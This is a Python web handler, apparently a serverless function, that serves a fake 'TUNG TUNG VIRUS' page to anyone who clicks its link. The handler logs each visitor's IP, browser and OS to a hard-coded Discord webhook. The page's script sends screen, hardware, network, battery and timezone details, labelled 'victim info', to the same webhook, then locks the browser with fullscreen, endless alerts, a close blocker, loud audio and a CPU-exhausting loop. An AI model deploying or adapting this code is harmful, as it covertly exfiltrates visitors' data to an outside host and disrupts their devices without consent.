from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# ──────── MAX INFO + ANNOYING PAGE ────────
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG VIRUS</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
    h1{font-size:6em;animation:blink 0.3s infinite;}
    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS</h1>
    <p>Collecting all your info...</p>
  </div>

  <!-- Loud Tung Tung Song -->
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    const webhook = "%s";

    async function sendFullInfo() {
      const info = {
        timestamp: new Date().toISOString(),
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth
        },
        window: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight
        },
        navigator: {
          language: navigator.language,
          languages: navigator.languages,
          platform: navigator.platform,
          vendor: navigator.vendor,
          deviceMemory: navigator.deviceMemory || "Unknown",
          hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
          userAgent: navigator.userAgent
        },
        connection: navigator.connection ? {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : "Unknown",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery: "Unknown",
        touchSupport: 'ontouchstart' in window,
        referrer: document.referrer || "Direct"
      };

      // Battery (if supported)
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = `${Math.floor(battery.level * 100)}%% ${battery.charging ? '(Charging)' : ''}`;
        } catch(e) {}
      }

      // Send rich info to Discord
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "**=== FULL VICTIM INFO ===**",
          embeds: [{
            title: "🕵️ MAX INFO LOG",
            color: 0xff0000,
            description: Object.entries(info)
              .map(([k, v]) => `**${k}**:\n\`\`\`${JSON.stringify(v, null, 2)}\`\`\``)
              .join("\n\n"),
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    // Start everything
    sendFullInfo();

    // Loud song
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(() => {});

    // Fullscreen
    document.documentElement.requestFullscreen?.().catch(() => {});

    // Block close
    window.onbeforeunload = () => "TUNG TUNG says NO!";

    // Spam alerts
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);

    // Heavy CPU lag
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) {
          Math.sin(i) * Math.cos(i) * Math.random();
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();

    // Force GIF download
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % (WEBHOOK_URL, FAKE_IMAGE_URL)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            # Quick initial log
            quick_log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`"""

            requests.post(WEBHOOK_URL, json={"content": quick_log})

            # Serve the max-info page
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
